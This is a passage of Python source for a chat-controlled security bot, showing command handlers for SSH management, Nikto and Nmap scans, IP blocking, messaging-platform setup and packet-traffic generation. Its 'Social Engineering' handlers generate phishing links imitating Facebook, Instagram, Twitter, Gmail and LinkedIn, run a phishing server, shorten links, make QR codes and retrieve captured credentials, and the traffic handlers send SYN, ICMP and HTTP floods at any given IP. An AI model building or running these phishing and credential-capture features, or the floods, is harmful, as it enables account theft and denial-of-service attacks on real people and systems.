    def _execute_time_diff(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 2:
            return self._create_result(False, "Usage: time_diff <time1> <time2> (HH:MM:SS)")
        result = self.time_manager.get_time_difference(args[0], args[1])
        return self._create_result(True, result)
    
    def _execute_date_diff(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 2:
            return self._create_result(False, "Usage: date_diff <date1> <date2> (YYYY-MM-DD)")
        result = self.time_manager.get_date_difference(args[0], args[1])
        return self._create_result(True, result)
    
    def _execute_time_add(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 2:
            return self._create_result(False, "Usage: time_add <time> [seconds] [minutes] [hours] [days]")
        time_str = args[0]
        seconds = int(args[1]) if len(args) > 1 else 0
        minutes = int(args[2]) if len(args) > 2 else 0
        hours = int(args[3]) if len(args) > 3 else 0
        days = int(args[4]) if len(args) > 4 else 0
        result = self.time_manager.add_time(time_str, seconds, minutes, hours, days)
        return self._create_result(True, result)
    
    def _execute_date_add(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 2:
            return self._create_result(False, "Usage: date_add <date> [days] [weeks] [months] [years]")
        date_str = args[0]
        days = int(args[1]) if len(args) > 1 else 0
        weeks = int(args[2]) if len(args) > 2 else 0
        months = int(args[3]) if len(args) > 3 else 0
        years = int(args[4]) if len(args) > 4 else 0
        result = self.time_manager.add_date(date_str, days, weeks, months, years)
        return self._create_result(True, result)
    
    def _execute_history(self, args: List[str]) -> Dict[str, Any]:
        limit = 20
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        history = self.db.get_command_history(limit)
        if not history:
            return self._create_result(True, "📜 No command history found.")
        output = f"📜 Command History (Last {len(history)}):\n"
        output += "─" * 50 + "\n"
        for i, cmd in enumerate(history, 1):
            status = "✅" if cmd['success'] else "❌"
            output += f"{i:2d}. {status} [{cmd['timestamp'][:19]}] {cmd['command'][:50]}\n"
            if len(cmd['command']) > 50:
                output += "   " + " " * 4 + "...\n"
        return self._create_result(True, output)
    
    def _execute_time_history(self, args: List[str]) -> Dict[str, Any]:
        limit = 20
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        history = self.db.get_time_history(limit)
        if not history:
            return self._create_result(True, "⏰ No time/date command history found.")
        output = f"⏰ Time/Date Command History (Last {len(history)}):\n"
        output += "─" * 50 + "\n"
        for i, cmd in enumerate(history, 1):
            output += f"{i:2d}. [{cmd['timestamp'][:19]}] {cmd['command']}\n"
            if cmd['result']:
                output += f"     → {cmd['result'][:50]}\n"
        return self._create_result(True, output)
    
    # ==================== SSH Command Handlers ====================
    def _execute_ssh_add(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        if len(args) < 3:
            return self._create_result(False, "Usage: ssh_add <name> <host> <username> [password] [port] [notes]")
        name = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        port = int(args[4]) if len(args) > 4 and args[4].isdigit() else 22
        notes = ' '.join(args[5:]) if len(args) > 5 else ""
        key_file = None
        if password and password.endswith('.pem') or password.endswith('.key'):
            key_file = password
            password = None
        result = self.ssh.add_server(name, host, username, password, key_file, port, notes)
        return self._create_result(result['success'], result)
    
    def _execute_ssh_list(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        servers = self.ssh.get_servers()
        status = self.ssh.get_status()
        return self._create_result(True, {'servers': servers, 'count': len(servers), 'connections': status})
    
    def _execute_ssh_connect(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        if not args:
            return self._create_result(False, "Usage: ssh_connect <server_id>")
        result = self.ssh.connect(args[0])
        return self._create_result(result['success'], result)
    
    def _execute_ssh_exec(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        if len(args) < 2:
            return self._create_result(False, "Usage: ssh_exec <server_id> <command>")
        server_id = args[0]
        command = ' '.join(args[1:])
        result = self.ssh.execute_command(server_id, command, executed_by="cli")
        return self._create_result(result.success, {'output': result.output, 'error': result.error, 'execution_time': result.execution_time, 'server': result.server, 'command': result.command})
    
    def _execute_ssh_upload(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        if len(args) < 3:
            return self._create_result(False, "Usage: ssh_upload <server_id> <local_path> <remote_path>")
        server_id = args[0]
        local_path = args[1]
        remote_path = args[2]
        if not os.path.exists(local_path):
            return self._create_result(False, f"Local file not found: {local_path}")
        result = self.ssh.upload_file(server_id, local_path, remote_path)
        return self._create_result(result['success'], result)
    
    def _execute_ssh_download(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        if len(args) < 3:
            return self._create_result(False, "Usage: ssh_download <server_id> <remote_path> <local_path>")
        server_id = args[0]
        remote_path = args[1]
        local_path = args[2]
        os.makedirs(os.path.dirname(os.path.abspath(local_path)), exist_ok=True)
        result = self.ssh.download_file(server_id, remote_path, local_path)
        return self._create_result(result['success'], result)
    
    def _execute_ssh_disconnect(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        server_id = args[0] if args else None
        self.ssh.disconnect(server_id)
        return self._create_result(True, f"Disconnected from server {server_id}" if server_id else "Disconnected from all servers")
    
    def _execute_ssh_status(self, args: List[str]) -> Dict[str, Any]:
        if not self.ssh:
            return self._create_result(False, "SSH manager not initialized")
        server_id = args[0] if args else None
        status = self.ssh.get_status(server_id)
        return self._create_result(True, status)
    
    # ==================== Traffic Generation Command Handlers ====================
    def _execute_generate_traffic(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen:
            return self._create_result(False, "Traffic generator not initialized")
        if len(args) < 3:
            return self._create_result(False, "Usage: generate_traffic <type> <ip> <duration> [port] [rate]\nExample: generate_traffic icmp 192.168.1.1 10")
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except ValueError:
            return self._create_result(False, f"Invalid duration: {args[2]}")
        port = None
        if len(args) >= 4:
            try:
                port = int(args[3])
            except ValueError:
                return self._create_result(False, f"Invalid port: {args[3]}")
        rate = 100
        if len(args) >= 5:
            try:
                rate = int(args[4])
            except ValueError:
                return self._create_result(False, f"Invalid rate: {args[4]}")
        available_types = self.traffic_gen.get_available_traffic_types()
        if traffic_type not in available_types:
            return self._create_result(False, f"Invalid traffic type. Available: {', '.join(available_types)}")
        max_duration = self.traffic_gen.config.get('traffic_generation', {}).get('max_duration', 300)
        if duration > max_duration:
            return self._create_result(False, f"Duration exceeds maximum allowed ({max_duration} seconds)")
        max_rate = self.traffic_gen.config.get('traffic_generation', {}).get('max_packet_rate', 1000)
        if rate > max_rate:
            return self._create_result(False, f"Packet rate exceeds maximum allowed ({max_rate} packets/second)")
        try:
            generator = self.traffic_gen.generate_traffic(
                traffic_type=traffic_type,
                target_ip=target_ip,
                duration=duration,
                port=port,
                packet_rate=rate,
                executed_by="cli"
            )
            return self._create_result(True, {
                'traffic_type': generator.traffic_type,
                'target_ip': generator.target_ip,
                'target_port': generator.target_port,
                'duration': generator.duration,
                'packet_rate': rate,
                'start_time': generator.start_time,
                'status': generator.status,
                'message': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration} seconds"
            })
        except Exception as e:
            return self._create_result(False, f"Traffic generation failed: {e}")
    
    def _execute_traffic_types(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen:
            return self._create_result(False, "Traffic generator not initialized")
        available_types = self.traffic_gen.get_available_traffic_types()
        help_text = self.traffic_gen.get_traffic_types_help()
        return self._create_result(True, {
            'available_types': available_types,
            'count': len(available_types),
            'help': help_text,
            'config': self.traffic_gen.config.get('traffic_generation', {})
        })
    
    def _execute_traffic_status(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen:
            return self._create_result(False, "Traffic generator not initialized")
        active = self.traffic_gen.get_active_generators()
        return self._create_result(True, {
            'active_count': len(active),
            'active_generators': active,
            'has_raw_socket_permission': self.traffic_gen.has_raw_socket_permission,
            'scapy_available': self.traffic_gen.scapy_available
        })
    
    def _execute_traffic_stop(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen:
            return self._create_result(False, "Traffic generator not initialized")
        if args:
            generator_id = args[0]
            if self.traffic_gen.stop_generation(generator_id):
                return self._create_result(True, f"Stopped traffic generator {generator_id}")
            else:
                return self._create_result(False, f"Generator {generator_id} not found")
        else:
            self.traffic_gen.stop_generation()
            return self._create_result(True, "Stopped all traffic generators")
    
    def _execute_traffic_logs(self, args: List[str]) -> Dict[str, Any]:
        limit = 10
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        logs = self.db.get_traffic_logs(limit)
        return self._create_result(True, {'logs': logs, 'count': len(logs)})
    
    def _execute_traffic_help(self, args: List[str]) -> Dict[str, Any]:
        if not self.traffic_gen:
            return self._create_result(False, "Traffic generator not initialized")
        help_text = self.traffic_gen.get_traffic_types_help()
        examples = "\nExamples:\n  generate_traffic icmp 192.168.1.1 10\n  generate_traffic tcp_syn 192.168.1.1 30 80\n  generate_traffic http_get 192.168.1.1 60 80 200\n  generate_traffic mixed 192.168.1.1 120\n  generate_traffic dns 8.8.8.8 30 53\n  traffic_status\n  traffic_stop"
        return self._create_result(True, {'help': help_text + examples, 'available_types': self.traffic_gen.get_available_traffic_types()})
    
    # ==================== Nikto Command Handlers ====================
    def _execute_nikto(self, args: List[str]) -> Dict[str, Any]:
        if not self.nikto:
            return self._create_result(False, "Nikto scanner not initialized")
        if not self.nikto.nikto_available:
            return self._create_result(False, "Nikto is not installed. Please install Nikto first.")
        if not args:
            return self._create_result(False, "Usage: nikto <target> [options]\nExamples:\n  nikto example.com\n  nikto https://example.com\n  nikto 192.168.1.1:8080")
        target = args[0]
        options = {}
        for i in range(1, len(args)):
            if args[i] == '-ssl':
                options['ssl'] = True
            elif args[i] == '-port' and i + 1 < len(args):
                options['port'] = args[i + 1]
            elif args[i] == '-level' and i + 1 < len(args):
                try:
                    options['level'] = int(args[i + 1])
                except:
                    pass
            elif args[i] == '-timeout' and i + 1 < len(args):
                try:
                    options['timeout'] = int(args[i + 1])
                except:
                    pass
            elif args[i] == '-verbose':
                options['verbose'] = True
            elif args[i] == '-debug':
                options['debug'] = True
        if not options.get('ssl') and 'https://' in target:
            options['ssl'] = True
        elif not options.get('ssl'):
            host = target.split(':')[0]
            if '://' in host:
                host = host.split('://')[1]
            if self.nikto.check_target_ssl(host):
                options['ssl'] = True
        result = self.nikto.scan(target, options)
        if result.success:
            scan_result = ScanResult(
                target=target,
                scan_type=ScanType.NIKTO,
                open_ports=[],
                timestamp=result.timestamp,
                success=True,
                vulnerabilities=result.vulnerabilities
            )
            self.db.log_scan(scan_result)
            return self._create_result(True, {
                'target': target,
                'scan_type': 'Nikto Web Vulnerability Scan',
                'vulnerabilities_found': len(result.vulnerabilities),
                'vulnerabilities': result.vulnerabilities[:20],
                'scan_time': f"{result.scan_time:.2f}s",
                'output_file': result.output_file,
                'timestamp': result.timestamp
            })
        else:
            return self._create_result(False, f"Nikto scan failed: {result.error}")
    
    def _execute_nikto_full(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nikto_full <target>")
        target = args[0]
        options = {'tuning': '123456789', 'level': 3, 'timeout': 600, 'verbose': True}
        if 'https://' in target or self.nikto.check_target_ssl(target):
            options['ssl'] = True
        result = self.nikto.scan(target, options)
        if result.success:
            return self._create_result(True, {
                'target': target,
                'scan_type': 'Full Nikto Scan',
                'vulnerabilities_found': len(result.vulnerabilities),
                'vulnerabilities': result.vulnerabilities[:30],
                'scan_time': f"{result.scan_time:.2f}s",
                'output_file': result.output_file
            })
        else:
            return self._create_result(False, f"Full Nikto scan failed: {result.error}")
    
    def _execute_nikto_ssl(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nikto_ssl <target>")
        target = args[0]
        options = {'ssl': True, 'tuning': '6', 'timeout': 300}
        result = self.nikto.scan(target, options)
        if result.success:
            return self._create_result(True, {
                'target': target,
                'scan_type': 'Nikto SSL/TLS Scan',
                'vulnerabilities_found': len(result.vulnerabilities),
                'vulnerabilities': result.vulnerabilities[:20],
                'scan_time': f"{result.scan_time:.2f}s"
            })
        else:
            return self._create_result(False, f"SSL/TLS scan failed: {result.error}")
    
    def _execute_nikto_cgi(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nikto_cgi <target>")
        target = args[0]
        options = {'tuning': '2', 'timeout': 300}
        result = self.nikto.scan(target, options)
        if result.success:
            return self._create_result(True, {
                'target': target,
                'scan_type': 'Nikto CGI Scan',
                'vulnerabilities_found': len(result.vulnerabilities),
                'vulnerabilities': result.vulnerabilities[:20],
                'scan_time': f"{result.scan_time:.2f}s"
            })
        else:
            return self._create_result(False, f"CGI scan failed: {result.error}")
    
    def _execute_nikto_sql(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nikto_sql <target>")
        target = args[0]
        options = {'tuning': '4', 'timeout': 300}
        result = self.nikto.scan(target, options)
        if result.success:
            return self._create_result(True, {
                'target': target,
                'scan_type': 'Nikto SQL Injection Scan',
                'vulnerabilities_found': len(result.vulnerabilities),
                'vulnerabilities': result.vulnerabilities[:20],
                'scan_time': f"{result.scan_time:.2f}s"
            })
        else:
            return self._create_result(False, f"SQL injection scan failed: {result.error}")
    
    def _execute_nikto_xss(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: nikto_xss <target>")
        target = args[0]
        options = {'tuning': '5', 'timeout': 300}
        result = self.nikto.scan(target, options)
        if result.success:
            return self._create_result(True, {
                'target': target,
                'scan_type': 'Nikto XSS Scan',
                'vulnerabilities_found': len(result.vulnerabilities),
                'vulnerabilities': result.vulnerabilities[:20],
                'scan_time': f"{result.scan_time:.2f}s"
            })
        else:
            return self._create_result(False, f"XSS scan failed: {result.error}")
    
    def _execute_nikto_status(self, args: List[str]) -> Dict[str, Any]:
        if not self.nikto:
            return self._create_result(False, "Nikto scanner not initialized")
        status = {
            'available': self.nikto.nikto_available,
            'scan_types': self.nikto.get_available_scan_types(),
            'config': {
                'enabled': self.nikto.config.get('enabled', True),
                'timeout': self.nikto.config.get('timeout', 300),
                'max_targets': self.nikto.config.get('max_targets', 10),
                'scan_level': self.nikto.config.get('scan_level', 2)
            }
        }
        if not self.nikto.nikto_available:
            status['installation_help'] = {
                'linux': 'sudo apt-get install nikto',
                'mac': 'brew install nikto',
                'windows': 'Download from https://github.com/sullo/nikto'
            }
        return self._create_result(True, status)
    
    def _execute_nikto_results(self, args: List[str]) -> Dict[str, Any]:
        limit = 10
        if args:
            try:
                limit = int(args[0])
            except:
                pass
        scans = self.db.get_nikto_scans(limit)
        return self._create_result(True, {'recent_scans': scans, 'count': len(scans)})
    
    # ==================== IP Management Command Handlers ====================
    def _execute_add_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: add_ip <ip> [notes]")
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else "Added via command"
        try:
            ipaddress.ip_address(ip)
            success = self.db.add_managed_ip(ip, "cli", notes)
            return self._create_result(success, f"✅ IP {ip} added to monitoring" if success else f"Failed to add IP {ip} (may already exist)")
        except ValueError:
            return self._create_result(False, f"Invalid IP address: {ip}")
    
    def _execute_remove_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: remove_ip <ip>")
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            success = self.db.remove_managed_ip(ip)
            return self._create_result(success, f"✅ IP {ip} removed from monitoring" if success else f"IP {ip} not found in monitoring")
        except ValueError:
            return self._create_result(False, f"Invalid IP address: {ip}")
    
    def _execute_block_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: block_ip <ip> [reason]")
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else "Manually blocked"
        try:
            ipaddress.ip_address(ip)
            firewall_success = NetworkTools.block_ip_firewall(ip)
            db_success = self.db.block_ip(ip, reason, "cli")
            if firewall_success or db_success:
                return self._create_result(True, {
                    'ip': ip,
                    'reason': reason,
                    'firewall_blocked': firewall_success,
                    'database_updated': db_success,
                    'message': f"✅ IP {ip} blocked successfully"
                })
            else:
                return self._create_result(False, f"Failed to block IP {ip}")
        except ValueError:
            return self._create_result(False, f"Invalid IP address: {ip}")
    
    def _execute_unblock_ip(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: unblock_ip <ip>")
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            firewall_success = NetworkTools.unblock_ip_firewall(ip)
            db_success = self.db.unblock_ip(ip, "cli")
            if firewall_success or db_success:
                return self._create_result(True, {
                    'ip': ip,
                    'firewall_unblocked': firewall_success,
                    'database_updated': db_success,
                    'message': f"✅ IP {ip} unblocked successfully"
                })
            else:
                return self._create_result(False, f"Failed to unblock IP {ip}")
        except ValueError:
            return self._create_result(False, f"Invalid IP address: {ip}")
    
    def _execute_list_ips(self, args: List[str]) -> Dict[str, Any]:
        include_blocked = True
        if args and args[0].lower() == 'active':
            include_blocked = False
        ips = self.db.get_managed_ips(include_blocked)
        if not ips:
            return self._create_result(True, {'ips': [], 'count': 0, 'message': 'No managed IPs found'})
        ip_list = []
        for ip in ips:
            ip_list.append({
                'ip': ip['ip_address'],
                'added_by': ip.get('added_by', 'unknown'),
                'added_date': ip.get('added_date', ''),
                'is_blocked': ip.get('is_blocked', False),
                'block_reason': ip.get('block_reason', ''),
                'alert_count': ip.get('alert_count', 0),
                'notes': ip.get('notes', '')
            })
        return self._create_result(True, {
            'ips': ip_list,
            'count': len(ip_list),
            'blocked_count': len([ip for ip in ip_list if ip['is_blocked']])
        })
    
    def _execute_ip_info(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: ip_info <ip>")
        ip = args[0]
        try:
            ipaddress.ip_address(ip)
            db_info = self.db.get_ip_info(ip)
            location = NetworkTools.get_ip_location(ip)
            threats = self.db.get_threats_by_ip(ip, 5)
            return self._create_result(True, {
                'ip': ip,
                'database_info': db_info,
                'location': location if location.get('success') else None,
                'recent_threats': threats,
                'threat_count': len(threats)
            })
        except ValueError:
            return self._create_result(False, f"Invalid IP address: {ip}")
    
    # ==================== WhatsApp Command Handlers ====================
    def _execute_whatsapp_config(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: whatsapp_config <phone_number> [prefix=/]")
        phone = args[0]
        prefix = args[1] if len(args) > 1 else "/"
        return self._create_result(True, {
            'phone': phone,
            'prefix': prefix,
            'message': f"WhatsApp configuration saved. Use 'start_whatsapp' to start the bot."
        })
    
    def _execute_whatsapp_allow(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: whatsapp_allow <phone_number>")
        return self._create_result(True, {
            'phone': args[0],
            'message': f"Contact {args[0]} added to allowed list."
        })
    
    def _execute_whatsapp_disallow(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: whatsapp_disallow <phone_number>")
        return self._create_result(True, {
            'phone': args[0],
            'message': f"Contact {args[0]} removed from allowed list."
        })
    
    def _execute_whatsapp_status(self, args: List[str]) -> Dict[str, Any]:
        return self._create_result(True, {'status': 'Use "status" command for full bot status', 'configured': True})
    
    # ==================== Signal Command Handlers ====================
    def _execute_signal_config(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: signal_config <phone_number> [prefix=!]")
        phone = args[0]
        prefix = args[1] if len(args) > 1 else "!"
        return self._create_result(True, {
            'phone': phone,
            'prefix': prefix,
            'message': f"Signal configuration saved. Use 'signal_register' to register device, then 'start_signal' to start the bot."
        })
    
    def _execute_signal_allow(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: signal_allow <phone_number>")
        return self._create_result(True, {
            'phone': args[0],
            'message': f"Number {args[0]} added to allowed list."
        })
    
    def _execute_signal_disallow(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: signal_disallow <phone_number>")
        return self._create_result(True, {
            'phone': args[0],
            'message': f"Number {args[0]} removed from allowed list."
        })
    
    def _execute_signal_register(self, args: List[str]) -> Dict[str, Any]:
        return self._create_result(True, {'message': "Signal registration initiated. Follow the prompts in the console."})
    
    def _execute_signal_status(self, args: List[str]) -> Dict[str, Any]:
        return self._create_result(True, {'status': 'Use "status" command for full bot status', 'configured': True})
    
    # ==================== Slack Command Handlers ====================
    def _execute_slack_config(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: slack_config <bot_token> [channel_id] [prefix=!]")
        bot_token = args[0]
        channel_id = args[1] if len(args) > 1 else ""
        prefix = args[2] if len(args) > 2 else "!"
        return self._create_result(True, {
            'bot_token': '✅ Configured' if bot_token else '❌ Missing',
            'channel_id': channel_id or 'Not set',
            'prefix': prefix,
            'message': f"Slack configuration saved. Use 'start_slack' to start the bot."
        })
    
    def _execute_slack_allow(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: slack_allow <user_id>")
        return self._create_result(True, {
            'user_id': args[0],
            'message': f"User {args[0]} added to allowed list."
        })
    
    def _execute_slack_disallow(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: slack_disallow <user_id>")
        return self._create_result(True, {
            'user_id': args[0],
            'message': f"User {args[0]} removed from allowed list."
        })
    
    def _execute_slack_status(self, args: List[str]) -> Dict[str, Any]:
        return self._create_result(True, {'status': 'Use "status" command for full bot status', 'configured': True})
    
    # ==================== iMessage Command Handlers ====================
    def _execute_imessage_config(self, args: List[str]) -> Dict[str, Any]:
        if not IMESSAGE_AVAILABLE:
            return self._create_result(False, "iMessage only available on macOS")
        numbers = args if args else []
        return self._create_result(True, {
            'phone_numbers': numbers,
            'count': len(numbers),
            'message': f"iMessage configuration saved. Use 'start_imessage' to start the bot."
        })
    
    def _execute_imessage_allow(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: imessage_allow <phone_number>")
        return self._create_result(True, {
            'phone': args[0],
            'message': f"Number {args[0]} added to allowed list."
        })
    
    def _execute_imessage_disallow(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: imessage_disallow <phone_number>")
        return self._create_result(True, {
            'phone': args[0],
            'message': f"Number {args[0]} removed from allowed list."
        })
    
    def _execute_imessage_add_watch(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: imessage_add_watch <phone_number>")
        return self._create_result(True, {
            'phone': args[0],
            'message': f"Number {args[0]} added to watch list."
        })
    
    def _execute_imessage_status(self, args: List[str]) -> Dict[str, Any]:
        return self._create_result(True, {
            'status': 'Use "status" command for full bot status',
            'available': IMESSAGE_AVAILABLE,
            'configured': True
        })
    
    # ==================== Social Engineering Command Handlers ====================
    def _execute_phishing_facebook(self, args: List[str]) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link("facebook")
        return self._create_result(result['success'], result)
    
    def _execute_phishing_instagram(self, args: List[str]) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link("instagram")
        return self._create_result(result['success'], result)
    
    def _execute_phishing_twitter(self, args: List[str]) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link("twitter")
        return self._create_result(result['success'], result)
    
    def _execute_phishing_gmail(self, args: List[str]) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link("gmail")
        return self._create_result(result['success'], result)
    
    def _execute_phishing_linkedin(self, args: List[str]) -> Dict[str, Any]:
        result = self.social_tools.generate_phishing_link("linkedin")
        return self._create_result(result['success'], result)
    
    def _execute_phishing_custom(self, args: List[str]) -> Dict[str, Any]:
        custom_url = args[0] if args else None
        result = self.social_tools.generate_phishing_link("custom", custom_url)
        return self._create_result(result['success'], result)
    
    def _execute_phishing_start(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: phishing_start_server <link_id> [port]")
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        success = self.social_tools.start_phishing_server(link_id, port)
        if success:
            url = self.social_tools.get_server_url()
            return self._create_result(True, {
                'message': f"Phishing server started on {url}",
                'url': url,
                'port': port,
                'link_id': link_id
            })
        else:
            return self._create_result(False, f"Failed to start phishing server for link {link_id}")
    
    def _execute_phishing_stop(self, args: List[str]) -> Dict[str, Any]:
        self.social_tools.stop_phishing_server()
        return self._create_result(True, "Phishing server stopped")
    
    def _execute_phishing_status(self, args: List[str]) -> Dict[str, Any]:
        status = {
            'server_running': self.social_tools.phishing_server.running,
            'server_url': self.social_tools.get_server_url() if self.social_tools.phishing_server.running else None,
            'port': self.social_tools.phishing_server.port if self.social_tools.phishing_server.running else None,
            'active_link_id': self.social_tools.phishing_server.link_id if self.social_tools.phishing_server.running else None,
            'platform': self.social_tools.phishing_server.platform if self.social_tools.phishing_server.running else None
        }
        return self._create_result(True, status)
    
    def _execute_phishing_links(self, args: List[str]) -> Dict[str, Any]:
        active_links = self.social_tools.get_active_links()
        all_links = self.db.get_phishing_links()
        return self._create_result(True, {'active_links': active_links, 'all_links': all_links, 'total': len(all_links)})
    
    def _execute_phishing_credentials(self, args: List[str]) -> Dict[str, Any]:
        link_id = args[0] if args else None
        credentials = self.social_tools.get_captured_credentials(link_id)
        return self._create_result(True, credentials)
    
    def _execute_phishing_qr(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: phishing_qr <link_id>")
        link_id = args[0]
        qr_path = self.social_tools.generate_qr_code(link_id)
        if qr_path:
            return self._create_result(True, {'message': f"QR code generated: {qr_path}", 'path': qr_path})
        else:
            return self._create_result(False, f"Failed to generate QR code for link {link_id}")
    
    def _execute_phishing_shorten(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: phishing_shorten <link_id>")
        link_id = args[0]
        short_url = self.social_tools.shorten_url(link_id)
        if short_url:
            return self._create_result(True, {'message': f"URL shortened: {short_url}", 'short_url': short_url})
        else:
            return self._create_result(False, f"Failed to shorten URL for link {link_id}")
    
    def _execute_phishing_template(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            templates = self.db.get_phishing_templates()
            return self._create_result(True, templates)
        if args[0] == 'list':
            platform = args[1] if len(args) > 1 else None
            templates = self.db.get_phishing_templates(platform)
            return self._create_result(True, templates)
        elif args[0] == 'save' and len(args) >= 3:
            name = args[1]
            platform = args[2]
            html_content = self.social_tools._get_custom_template()
            success = self.db.save_phishing_template(name, platform, html_content)
            return self._create_result(success, f"Template {name} saved" if success else "Failed to save template")
        return self._create_result(False, "Unknown template command")
    
    # ==================== Nmap Command Handlers ====================
    def _execute_db_nmap(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: !db_nmap <option> <target>")
        option = args[0]
        target = args[1] if len(args) > 1 else None
        if not target:
            return self._create_result(False, "Target required")
        options = {}
        if option == '-sn':
            options['scan_type'] = 'ping'
            result = self.nmap.ping_sweep(target)
        elif option == '-O':
            options['scan_type'] = 'os'
            result = self.nmap.os_detection(target)
        elif option == '-sV':
            options['scan_type'] = 'version'
            result = self.nmap.version_detection(target)
        elif option == '-A':
            options['scan_type'] = 'aggressive'
            result = self.nmap.aggressive_scan(target)
        elif option == '--script vuln':
            options['scan_type'] = 'vuln'
            result = self.nmap.vuln_scan(target)
        else:
            ports = args[1] if len(args) > 1 else None
            options['ports'] = ports
            result = self.nmap.custom_scan(target, options)
        if result.get('success'):
            output = f"```\n{result.get('output', '')[:1500]}\n```"
        else:
            output = f"❌ {result.get('error', 'Scan failed')}"
        return self._create_result(result.get('success', False), output)
    
    # ==================== Auxiliary Module Command Handlers ====================
    def _execute_use(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            modules = self.aux.list_modules()
            output = "Available modules:\n"
            for mod in modules[:10]:
                output += f"  {mod['id']} - {mod['name']}\n"
            output += "\nUse: !use <module_path>"
            return self._create_result(True, output)
        module_path = args[0]
        if self.aux.use_module(module_path):
            return self._create_result(True, f"Using module: {module_path}")
        else:
            return self._create_result(False, f"Module not found: {module_path}")
    
    def _execute_set(self, args: List[str]) -> Dict[str, Any]:
        if len(args) < 2:
            return self._create_result(False, "Usage: !set <option> <value>")
        option = args[0]
        value = ' '.join(args[1:])
        if self.aux.set_option(option, value):
            return self._create_result(True, f"{option} => {value}")
        else:
            return self._create_result(False, f"Failed to set {option}")
    
    def _execute_run(self, args: List[str]) -> Dict[str, Any]:
        result = self.aux.run_module()
        if result.get('success'):
            if 'results' in result:
                output = f"✅ Module executed successfully\n\nResults:\n"
                for r in result['results'][:5]:
                    output += f"  • {json.dumps(r)}\n"
            else:
                output = "✅ Module executed successfully"
        else:
            output = f"❌ {result.get('error', 'Module execution failed')}"
        return self._create_result(result.get('success', False), output)
    
    def _execute_show(self, args: List[str]) -> Dict[str, Any]:
        if not args:
            return self._create_result(False, "Usage: !show <options|modules|payloads>")
        show_type = args[0].lower()
        if show_type == 'options':
            options = self.aux.show_options()
            if not options:
                return self._create_result(False, "No module selected")
            output = "Module options:\n\n"
            for opt_name, opt_info in options.items():
                current = opt_info.get('current', '')
                required = "(required)" if opt_info.get('required') else ""
                output += f"  {opt_name} = {current} {required}\n"
                output += f"      {opt_info.get('description', '')}\n"
        elif show_type == 'modules':
            modules = self.aux.list_modules()
            output = "Auxiliary modules:\n"
            for mod in modules[:10]:
                output += f"  {mod['id']}\n"
        elif show_type == 'payloads':
